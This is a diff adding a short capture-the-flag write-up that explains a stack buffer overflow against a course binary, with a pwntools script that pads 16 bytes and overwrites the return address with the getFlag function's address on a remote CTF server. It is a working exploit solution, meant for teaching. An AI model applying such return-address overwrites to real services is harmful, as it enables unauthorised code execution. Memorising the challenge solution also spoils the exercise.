@@ -1,0 +1,37 @@
+Made by Kasper Melheim
+
+The vulnerability with the program is that we as the user can search the binary file for the position of a getFlag function.
+This function can be used to return the data we are looking for. 
+Again, we also perform buffer overflow, which is also a failure in the security system of the program.
+
+To find the flag I first had to find out the placement of the getFlag function (found in the sourcecode of the program).
+I used "objdump -d 01b | grep getFlag" for this. This returns "00000000004011f6 <getFlag>". 
+01b is the binary file of the program.
+
+Found out we need to use 0x4011f6 as the address.
+I then use much of the same code from task 1, where I run bufferoverflow on the 16 bits, and add the address of the function at the end of that.
+The flag is then returned.
+
+Code in python:
+
+#imports
+from pwn import *
+
+#host and port number
+conn = remote('ctf21.softwaresecurity.no', 7001)
+
+#receive data from program
+conn.recvline()
+
+#overflow the 16 bits
+bufferoverflow = b'X'*16
+#target address
+target = p64(0x4011f6)
+print(target)
+
+#data we will send to the program
+data = bufferoverflow + target 
+
+#send data and flag will be returned
+conn.sendline(data)
+conn.interactive()
